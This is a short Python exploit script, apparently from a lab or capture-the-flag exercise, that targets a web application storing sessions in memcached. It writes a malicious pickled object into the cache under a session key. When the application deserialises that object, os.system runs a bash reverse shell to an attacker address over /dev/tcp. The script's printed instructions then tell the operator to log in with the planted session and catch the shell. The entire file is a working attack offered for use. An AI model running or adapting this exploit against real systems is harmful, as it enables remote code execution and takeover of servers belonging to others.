import pickle
import os
from pymemcache.client.base import Client
from pymemcache.exceptions import (
    MemcacheError,
    MemcacheClientError,
    MemcacheServerError,
    MemcacheUnknownError,)
 
MC_ERR = (MemcacheError, MemcacheClientError, MemcacheServerError, MemcacheUnknownError)
 
victim = "192.168.235.59"
victim_port = 11211
attacker = "192.168.49.235"
attacker_port = 11211
 
class RCE:
    def __reduce__(self):
        cmd = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{attacker}/{attacker_port} 0>&1'"
        return os.system, (cmd,)
 
 
if __name__ == '__main__':
    try:
        mc = Client(f"{victim}:{victim_port}")
        mc.set("session:you_have_been_pwned", pickle.dumps(RCE()))
        print ("[*]Payload Sent!")
        print (f"[*]NOW RUN 'memcdump --servers= {victim}' And look for new pwned session.\n[*]Then just log into the web server with pwned session and get the shell back.")   
    except MC_ERR as e:
        print(e)
